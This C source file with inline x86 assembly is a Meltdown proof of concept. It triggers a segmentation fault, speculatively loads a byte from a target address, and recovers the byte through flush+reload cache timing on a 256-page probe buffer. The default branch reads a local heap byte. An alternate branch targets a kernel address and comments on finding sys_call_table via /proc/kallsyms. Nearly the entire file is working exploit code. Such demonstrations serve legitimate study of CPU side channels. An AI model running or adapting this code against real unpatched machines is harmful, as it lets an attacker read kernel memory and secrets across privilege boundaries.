#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>

#define PAGE_SIZE_SHIFT     (0xC)
#define PAGE_SIZE_SHIFT_STR "0xC"
#define PAGE_SIZE           (1 << PAGE_SIZE_SHIFT)

__attribute__((always_inline))
inline unsigned long get_access_ticks(const char *addr)
{
    volatile unsigned long time;

    asm __volatile__ (
        "mfence             \n"
        "lfence             \n"
        "rdtsc              \n"
        "lfence             \n"
        "movl %%eax, %%esi  \n"
        "movl (%1), %%eax   \n"
        "lfence             \n"
        "rdtsc              \n"
        "subl %%esi, %%eax  \n"
        "clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (addr)
        :  "%esi", "%edx");

    return time;
}

__attribute__((always_inline))
inline void speculative_byte_load_and_cache_meltdown(uintptr_t ptr, char* buf)
{
    asm __volatile__ (
        "%=:                                  \n"
        "xorq %%rax, %%rax                    \n"
        "movb (%[ptr]), %%al                  \n"
        "shlq $" PAGE_SIZE_SHIFT_STR ", %%rax \n"
        "jz %=b                               \n"
        "movq (%[buf], %%rax, 1), %%rbx       \n"
        : 
        :  [ptr] "r" (ptr), [buf] "r" (buf)
        : "%rax", "%rbx");
}

__attribute__((always_inline))
inline void clflush(const char *address)
{
    asm __volatile__ (
        "mfence         \n"
        "clflush 0(%0)  \n"
        :
        : "r" (address)
        :            );
}

static jmp_buf jbuf;

static void sigsegv_handler(int signo)
{
    siglongjmp(jbuf, 1);
}

void main()
{
    uintptr_t address_to_guess_byte;

    if (1) { // testing with local address
        char *local_byte = malloc(1);
        *local_byte = 0xAA;
        address_to_guess_byte = (uintptr_t) local_byte;
    } else { // testing with global address
        address_to_guess_byte = 0xffffffff986001e0;
        // do tests on sys_call_table. your current sys_call_table address can be found: sudo cat /proc/kallsyms | grep sys_call_table
        // sys_read address should be first value in sys_call_table.
        // you can find your sys_read address: sudo cat /proc/kallsyms | grep sys_read
    }

    char *meltdown_buf = mmap(NULL, PAGE_SIZE * 256, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);

    signal(SIGSEGV, sigsegv_handler);

    for (int i = 0; i < 100; i++) {
        for (int i = 0; i < 256; i++) {
            clflush(&meltdown_buf[i * PAGE_SIZE]);
        }

        if(sigsetjmp(jbuf, !0) == 0) {
            *((char*)NULL) = 1; // force SIGSEGV (even when testing with local addrress)

            // the code below should not be executed because of SEISEGV
            // but don't worry. it most likely will be executed because of out-of-order execution optimizations in Intel CPUs :-)

            speculative_byte_load_and_cache_meltdown(address_to_guess_byte, meltdown_buf);

            printf("you should never see this line because of SIGSEGV above\n");
        } else { // else branch is executed on SIGSEGV
            static unsigned long ticks[256];

            // measure access ticks of each page in buffer
            for (int i = 0; i < 256; i++) {
                ticks[i] = get_access_ticks(&meltdown_buf[PAGE_SIZE * i]);
            }

            for (int i = 0; i < 256; i++) {
                if (ticks[i] < 200) { // reading from cache is usually less than 200 ticks on my CPU
                    // if the page is in cache then corresponding page shift is most likely byte value
                    printf("guessed byte: 0x%X\n", i);
                }
            }
        }
    }
}
